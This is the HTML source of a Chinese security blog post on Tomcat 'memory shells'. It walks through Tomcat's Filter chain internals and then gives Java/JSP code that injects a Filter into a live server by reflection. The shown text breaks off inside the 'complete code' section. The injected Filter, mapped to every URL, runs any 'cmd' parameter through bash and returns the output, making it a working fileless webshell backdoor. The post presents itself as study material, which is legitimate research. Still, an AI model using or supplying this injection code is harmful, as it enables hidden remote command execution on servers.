

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="reader-l">
  <meta name="keywords" content="reader-l&#39;s blog">
  <title>Tomcat内存马学习一-Filter型 - reader-l&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/Links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/List/">
                <i class="iconfont icon-link-fill"></i>
                List
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="Tomcat内存马学习一-Filter型">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-05-09 09:39" pubdate>
        2021年5月9日 上午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      3k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      41
       分钟
    </span>
  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Tomcat内存马学习一-Filter型</h1>
            
              <p class="note note-info">
                
                  本文最后更新于：2021年5月16日 晚上
                
              </p>
            
            <div class="markdown-body">
              <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    在现在防护软件的越来越智能化以及开发人员、运维人员等IT行业人员的安全意识越来越高，传统的文件shell大多都气数已尽了，而内存马因其隐蔽性等优点从而越来越盛行。因此有必要的进行学习。</p>
<h1 id="2-知识简介"><a href="#2-知识简介" class="headerlink" title="2.知识简介"></a>2.知识简介</h1><h2 id="1-什么是Servlet"><a href="#1-什么是Servlet" class="headerlink" title="1.什么是Servlet"></a>1.什么是Servlet</h2><p>​    处理请求和发送响应的过程是由一种叫做<code>Servlet</code>的程序来完成的，并且<code>Servlet</code>是为了解决实现动态页面而衍生的东西。</p>
<h2 id="2-Tomcat和Servlet的关系"><a href="#2-Tomcat和Servlet的关系" class="headerlink" title="2.Tomcat和Servlet的关系"></a>2.Tomcat和Servlet的关系</h2><p>​    Tomcat 是Web应用服务器,是一个Servlet/JSP容器. Tomcat 作为Servlet容器,负责处理客户请求,把请求传送给Servlet,并将Servlet的响应传送回给客户。</p>
<p>​    其中Tomcat中有四种类型的Servlet容器，从上到下分别是 <code>Engine、Host、Context、Wrapper</code></p>
<ol>
<li>Engine，实现类为 <code>org.apache.catalina.core.StandardEngine</code></li>
<li>Host，实现类为 <code>org.apache.catalina.core.StandardHost</code></li>
<li>Context，实现类为 <code>org.apache.catalina.core.StandardContext</code></li>
<li>Wrapper，实现类为 <code>org.apache.catalina.core.StandardWrapper</code></li>
</ol>
<p>​    每个Wrapper实例表示一个具体的Servlet定义，StandardWrapper是Wrapper接口的标准实现类（StandardWrapper 的主要任务就是载入Servlet类并且进行实例化）</p>
<h2 id="3-Tomcat-容器"><a href="#3-Tomcat-容器" class="headerlink" title="3.Tomcat 容器"></a>3.Tomcat 容器</h2><p>​    在 Tomcat 中，每个 Host 下可以有多个 Context （Context 是 Host 的子容器）， 每个 Context 都代表一个具体的Web应用，都有一个唯一的路径，在一个 Context 下可以有着多个 Wrapper</p>
<p>​    Wrapper 主要负责管理 <code>Servlet</code> ，包括的 <code>Servlet</code> 的装载、初始化、执行以及资源回收。</p>
<h2 id="4-内存马简单介绍"><a href="#4-内存马简单介绍" class="headerlink" title="4.内存马简单介绍"></a>4.内存马简单介绍</h2><p>内存马现在有如下类型：</p>
<ol>
<li>servlet-api类<ul>
<li>filter型</li>
<li>servlet型</li>
</ul>
</li>
<li>spring类<ul>
<li>拦截器</li>
<li>controller型</li>
</ul>
</li>
<li>Java Instrumentation类<ul>
<li>agent型</li>
</ul>
</li>
</ol>
<h1 id="3-Filter型的内存马"><a href="#3-Filter型的内存马" class="headerlink" title="3.Filter型的内存马"></a>3.Filter型的内存马</h1><h2 id="1-Filter简介"><a href="#1-Filter简介" class="headerlink" title="1.Filter简介"></a>1.Filter简介</h2><p>​    我们可以通过自定义FIlter来对用户的一些请求进行拦截修改等操作。Filter 程序是一个实现了 Filter 接口的 Java 类，与 Servlet 程序相似，它由 Servlet容器进行调用和执行。这个 Servlet 过滤器就是我们的 filter，当在 web.xml 中注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，这个Filter 就成了 Tomcat 与该 Servlet 程序的通信线路上的一道关卡，该 Filter 可以对Servlet 容器发送给 Servlet 程序的请求和 Servlet 程序回送给 Servlet 容器的响应进行拦截，可以决定是否将请求继续传递给 Servlet 程序，以及对请求和相应信息是否进行修改。</p>
<p>​    如下图是其简单的工作流程图：摘自<a target="_blank" rel="noopener" href="https://paper.seebug.org/1441/#1jsp-webshell">https://paper.seebug.org/1441/#1jsp-webshell</a></p>
<p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/1.png" srcset="/img/loading.gif"></p>
<h2 id="2-Filter实例"><a href="#2-Filter实例" class="headerlink" title="2.Filter实例"></a>2.Filter实例</h2><p>先创建自定义的WebFilter：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.Tomcat;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebFilter(filterName = &quot;FilterDemo&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FilterDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig config)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Filter创建&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;执行过滤操作&quot;</span>);<br>        chain.doFilter(request, response);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>然后在web.xml中注册我们的Filter：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>MyFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>com.example.Tomcat.FilterDemo<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>MyFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>访问web项目的任何路径都会触发：</p>
<p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/2.png" srcset="/img/loading.gif"></p>
<h2 id="3-程序组装FIlter涉及的核心类"><a href="#3-程序组装FIlter涉及的核心类" class="headerlink" title="3.程序组装FIlter涉及的核心类"></a>3.程序组装FIlter涉及的核心类</h2><p>如下也是摘自seebug的文章<a target="_blank" rel="noopener" href="https://paper.seebug.org/1441/#1jsp-webshell">https://paper.seebug.org/1441/#1jsp-webshell</a></p>
<ul>
<li><strong>Filter</strong>过滤器接口一个 Filter 程序就是一个 Java 类，这个类必须实现 Filter 接口。javax.servlet.Filter 接口中定义了三个方法：init(Web 容器创建 Filter 的实例对象后，将立即调用该 Filter 对象的 init 方法)、doFilter(当一个 Filter 对象能够拦截访问请求时，Servlet 容器将调用 Filter 对象的 doFilter 方法)、destory(该方法在 Web 容器卸载 Filter 对象之前被调用)。</li>
<li><strong>FilterChain</strong>过滤器链 FilterChain 对象中有一个 doFilter() 方法，该方法的作用是让 Filter 链上的当前过滤器放行，使请求进入下一个 Filter.Filter和FilterChain密不可分, Filter可以实现依次调用正是因为有了FilterChain</li>
<li><strong>FilterConfig</strong>过滤器的配置,与普通的 Servlet 程序一样，Filter 程序也很可能需要访问 Servlet 容器。Servlet 规范将代表 ServletContext 对象和 Filter 的配置参数信息都封装到一个称为 FilterConfig 的对象中。FilterConfig 接口则用于定义 FilterConfig 对象应该对外提供的方法，以便在 Filter 程序中可以调用这些方法来获取 ServletContext 对象，以及获取在 web.xml 文件中为 Filter 设置的友好名称和初始化参数。</li>
<li><strong>FilterDef</strong>过滤器的配置和描述</li>
<li><strong>ApplicationFilterChain</strong>调用过滤器链</li>
<li><strong>ApplicationFilterConfig</strong>获取过滤器</li>
<li><strong>ApplicationFilterFactory</strong>组装过滤器链</li>
</ul>
<p>还有几个比较重要的类</p>
<ul>
<li><strong>WebXml</strong>从名字我们可以就看出来这个一个存放web.xml中内容的类</li>
<li><strong>ContextConfig</strong>一个web应用的上下文配置类</li>
<li><strong>StandardContext</strong>一个web应用上下文(Context接口)的标准实现</li>
<li><strong>StandardWrapperValve</strong>一个标准Wrapper的实现。一个上下文一般包括一个或者多个包装器，每一个包装器表示一个servlet。</li>
</ul>
<h2 id="4-源码分析"><a href="#4-源码分析" class="headerlink" title="4.源码分析"></a>4.源码分析</h2><p>​    我们将关注点放在<code>StandardWrapperValve</code>，因为在这里会进行过滤器的组装操作，有助于我们理解FIlter创建和调用的流程以及内存马的原理。</p>
<p>​    首先会先创建一个应用过滤器链：</p>
<p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/3.png" srcset="/img/loading.gif"></p>
<p>跟进<code>ApplicationFilterChain#createFilterChain</code>方法：</p>
<p>我们查看红框处的代码，首先会调用<code>getParent</code>获取当前<code>Context</code>实例，然后在从<code>Context</code>中找到<code>filterMaps</code>。</p>
<p>其中，还可以发现<code>filterMaps</code>里存放着我们过滤器的在web.xml中的配置。</p>
<p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/4.png" srcset="/img/loading.gif"></p>
<p>​    发现会遍历<code>FilterMaps</code>中的 <code>FilterMap</code>，如果发现符合当前请求 <code>url</code> 与<code>FilterMap</code>中的 <code>urlPattern</code> 想匹配，就会进入 if 判断语句：调用 <code>findFilterConfig </code>法在<code>filterConfigs</code>中寻找对应 <code>filterName</code>名称的 <code>FilterConfig</code></p>
<p>我在<code>web.xml</code>中对<code>urlPattern</code>的配置是使用通配符的<code>/*</code>，所以会进入到第一个判断语句：</p>
<p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/5.png" srcset="/img/loading.gif"></p>
<p>如果找到对应名称的<code>filterName</code>的<code>FilterConfig</code>，就会进入到第二个if判断语句：将 <code>filterConfig</code> 添加到 <code>filterChain</code>中。</p>
<p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/6.png" srcset="/img/loading.gif"></p>
<p>​    最后<code> filterChain</code> 组装完毕，重新回到 <code>StandardContextValue </code>中，调用<code> filterChain</code> 的 <code>doFilter </code>方法 ，就会依次调用 Filter 链上的<code> doFilter</code>方法</p>
<p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/7.png" srcset="/img/loading.gif"></p>
<p>跟进<code>doFilter</code>方法：</p>
<p>发现会调用<code>internalDoFilter</code>方法</p>
<p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/8.png" srcset="/img/loading.gif"></p>
<p>跟进<code>internalDoFilter</code>方法：</p>
<p>发现会依次从 filters 中取出 <code>filterConfig</code>，然后会调用 <code>getFilter() </code>将 filter 从<code>filterConfig </code>中取出，调用 filter 的 <code>doFilter</code>方法。从而调用我们自定义过滤器中的 doFilter 方法，从而触发了相应的代码。</p>
<p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/9.png" srcset="/img/loading.gif"></p>
<p>最后放一张蛋黄师傅（宽字节安全）绘制的图：</p>
<p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/10.png" srcset="/img/loading.gif"></p>
<p>总结：</p>
<ol>
<li>根据请求的 URL 从 <code>FilterMaps </code>中找出与之 URL 对应的 Filter 名称。</li>
<li>根据 Filter 名称去<code>FilterConfigs</code>中寻找对应名称的 <code>FilterConfig</code>。</li>
<li>找到对应的 <code>FilterConfig </code>之后添加到 <code>FilterChain</code>中，并且返回 <code>FilterChain。</code></li>
<li><code>filterChain </code>中调用 <code>internalDoFilter </code>遍历获取 chain 中的<code> FilterConfig</code> ，然后从 <code>FilterConfig </code>中获取 Filter，然后调用 Filter 的<code>doFilter</code>方法。</li>
</ol>
<h2 id="5-内存马注入"><a href="#5-内存马注入" class="headerlink" title="5.内存马注入"></a>5.内存马注入</h2><p>​    从前面的的分析，可以发现程序在创建过滤器链的时候，关注一下context变量，也就是<code>StandardContext</code>。就会发现它有三个和<code>filter</code>有关的成员变量。</p>
<p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/11.png" srcset="/img/loading.gif"></p>
<blockquote>
<ul>
<li><code>filterConfigs</code>：<code>filterConfig</code>的数组 <code>filterconfig</code>里面有<code>filterdef </code>以及filter对象。</li>
<li><code>filterDefs</code>：<code>filterRef</code>的数组 <code>FilterDef</code>的作用主要为描述filter的字符串名称与Filter实例的关系。</li>
<li><code>filterMaps</code>：<code>filterMap</code>的数组(<code>FilterMap</code>中存放了所有filter相关的信息包括<code>filterName</code>和<code>urlPattern</code>。有了这些之后，使用<code>matchFiltersURL</code>函数将每个filter和当前URL进行匹配，匹配成功的通过) <code>filterConfig</code>我们看过，这里注意，<code>filterConfig.filterRef</code>实际和<code>context.filterRef</code>指向的地址一样，也就是同一个东西。</li>
</ul>
</blockquote>
<p>如果我们能够修改这三个变量，或许就能达到利用<code>Filter</code>执行内存注入的操作（达到模拟web.xml的操作）</p>
<p>大致流程如下：</p>
<ol>
<li>获取context</li>
<li>创建一个恶意 Filter</li>
<li>利用 FilterDef 对 Filter 进行一个封装</li>
<li>将 FilterDef 添加到 FilterDefs 和 FilterConfig</li>
<li>创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发）</li>
</ol>
<h3 id="1-首先尝试获取context"><a href="#1-首先尝试获取context" class="headerlink" title="1.首先尝试获取context"></a>1.首先尝试获取context</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">ServletContext servletContext = request.getSession().getServletContext();<br>    Field appctx = servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">// ApplicationContext 为 ServletContext 的实现类</span><br>    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);<br><br>    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">// 这样我们就获取到了 context </span><br>    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);<br></code></pre></td></tr></table></figure>
<h3 id="2-创建恶意Filter"><a href="#2-创建恶意Filter" class="headerlink" title="2.创建恶意Filter"></a>2.创建恶意Filter</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><br>Field Configs = standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>Configs.setAccessible(<span class="hljs-keyword">true</span>);<br>Map filterConfigs = (Map) Configs.get(standardContext);<br><br><span class="hljs-keyword">if</span> (filterConfigs.get(name) == <span class="hljs-keyword">null</span>)&#123;<br>    Filter filter = <span class="hljs-keyword">new</span> Filter() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;<br>            HttpServletRequest req = (HttpServletRequest) servletRequest;<br>            <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-keyword">null</span>)&#123;<br>                <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>                Process process = <span class="hljs-keyword">new</span> ProcessBuilder(<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>                <span class="hljs-keyword">int</span> len = process.getInputStream().read(bytes);<br>                servletResponse.getWriter().write(<span class="hljs-keyword">new</span> String(bytes,<span class="hljs-number">0</span>,len));<br>                process.destroy();<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            filterChain.doFilter(servletRequest,servletResponse);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br><br>        &#125;<br><br>    &#125;;<br><br><br>    FilterDef filterDef = <span class="hljs-keyword">new</span> FilterDef();<br>    filterDef.setFilter(filter);<br>    filterDef.setFilterName(name);<br>    filterDef.setFilterClass(filter.getClass().getName());<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 将filterDef添加到filterDefs中</span><br><span class="hljs-comment">     */</span><br>    standardContext.addFilterDef(filterDef);<br><br>    FilterMap filterMap = <span class="hljs-keyword">new</span> FilterMap();<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setFilterName(name);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br><br>    standardContext.addFilterMapBefore(filterMap);<br><br>    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br><br>    filterConfigs.put(name,filterConfig);<br>    out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br></code></pre></td></tr></table></figure>
<h3 id="3-完整代码"><a href="#3-完整代码" class="headerlink" title="3.完整代码"></a>3.完整代码</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 